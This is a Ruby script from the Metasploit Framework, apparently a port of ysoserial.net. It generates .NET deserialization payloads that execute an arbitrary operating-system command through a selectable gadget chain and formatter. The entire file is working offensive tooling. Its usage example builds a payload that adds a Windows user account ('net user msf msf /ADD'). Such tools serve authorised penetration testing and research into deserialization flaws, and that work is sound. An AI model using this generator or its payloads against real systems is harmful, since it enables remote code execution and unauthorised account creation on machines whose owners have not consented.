#!/usr/bin/env ruby

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

msfbase = __FILE__
while File.symlink?(msfbase)
  msfbase = File.expand_path(File.readlink(msfbase), File.dirname(msfbase))
end
$:.unshift(File.expand_path(File.join(File.dirname(msfbase), '..', '..', '..', 'lib')))
require 'msfenv'
require 'rex'
require 'optparse'

DND = Msf::Util::DotNetDeserialization
BANNER = %Q{
Usage: #{__FILE__} [options]

Generate a .NET deserialization payload that will execute an operating system
command using the specified gadget chain and formatter.

Available formatters:
#{DND::Formatters::NAMES.map { |n| "    * #{n}\n"}.join}
Available gadget chains:
#{DND::GadgetChains::NAMES.map { |n| "    * #{n}\n"}.join}
Example: #{__FILE__} -c "net user msf msf /ADD" -f BinaryFormatter -g TextFormattingRunProperties
}.strip

def puts_transform_formats
  $stdout.puts 'Available transform formats:'
  $stdout.puts Msf::Simple::Buffer.transform_formats.map { |n| "    * #{n}\n"}.join
end

module YSoSerialDotNet
  class OptsConsole
    def self.parse(args)
      options = {
          formatter:     DND::DEFAULT_FORMATTER,
          gadget_chain:  DND::DEFAULT_GADGET_CHAIN,
          output_format: 'raw'
      }
      parser = OptionParser.new do |opt|
        opt.banner = BANNER
        opt.separator ''
        opt.separator 'Specific options:'

        opt.on('-c', '--command   <String>', 'The command to run') do |v|
          options[:command] = v
        end

        opt.on('-f', '--formatter <String>', "The formatter to use (default: #{DND::DEFAULT_FORMATTER})") do |v|
          options[:formatter] = v.to_sym
        end

        opt.on('-g', '--gadget    <String>', "The gadget chain to use (default: #{DND::DEFAULT_GADGET_CHAIN})") do |v|
          options[:gadget_chain] = v.to_sym
        end

        opt.on('-o', '--output    <String>', 'The output format to use (default: raw, see: --list-output-formats)') do |v|
          options[:output_format] = v.downcase
        end

        opt.on_tail('--list-output-formats', 'List available output formats, for use with --output') do |v|
          puts_transform_formats
          exit
        end

        opt.on_tail('-h', '--help', 'Show this message') do
          $stdout.puts opt
          exit
        end
      end

      parser.parse!(args)

      if options.empty?
        raise OptionParser::MissingArgument, 'No options set, try -h for usage'
      elsif options[:command].blank?
        raise OptionParser::MissingArgument, '-c is required'
      elsif !DND::Formatters::NAMES.include?(options[:formatter])
        raise OptionParser::InvalidArgument, "#{options[:formatter]} is not a valid formatter"
      elsif !DND::GadgetChains::NAMES.include?(options[:gadget_chain])
        raise OptionParser::InvalidArgument, "#{options[:gadget_chain]} is not a valid gadget chain"
      elsif !Msf::Simple::Buffer.transform_formats.include?(options[:output_format])
        raise OptionParser::InvalidArgument, "#{options[:output_format]} is not a valid output format"
      end

      options
    end
  end

  class Driver
    def initialize
      begin
        @opts = OptsConsole.parse(ARGV)
      rescue OptionParser::ParseError => e
        $stderr.puts "[x] #{e.message}"
        exit
      end
    end

    def run
      $stderr.puts "Gadget chain: #{@opts[:gadget_chain]}"
      $stderr.puts "Formatter:    #{@opts[:formatter]}"
      serialized = DND.generate(
        @opts[:command],
        gadget_chain: @opts[:gadget_chain],
        formatter: @opts[:formatter]
      )

      transformed = ::Msf::Simple::Buffer.transform(serialized, @opts[:output_format])
      $stderr.puts "Size:         #{transformed.length}"
      $stdout.puts transformed
    end

  end
end

if __FILE__ == $PROGRAM_NAME
  driver = YSoSerialDotNet::Driver.new
  begin
    driver.run
  rescue ::Exception => e
    elog(e)
    $stderr.puts "[x] #{e.class}: #{e.message}"
    $stderr.puts "[*] If necessary, please refer to framework.log for more details."
  end
end
